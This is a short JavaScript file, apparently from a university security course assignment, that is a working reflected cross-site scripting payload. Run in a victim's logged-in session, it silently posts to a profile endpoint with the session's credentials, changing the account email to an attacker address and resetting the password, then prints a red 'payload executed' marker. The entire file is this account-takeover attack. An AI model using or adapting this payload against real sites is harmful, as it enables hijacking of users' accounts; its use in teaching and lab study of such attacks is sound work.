// payload.js — FIT5003 A2 reflected XSS demo payload
// Runs in the victim's authenticated session, changes email and password.
(function () {
  const body = "email=attacker@evil.empire&password=pwned-by-xss";
  fetch("/profile", {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: body
  }).then(() => {
    // visual confirmation for the demo
    document.body.innerHTML += "<p style='color:red'>[XSS payload executed]</p>";
  });
})();
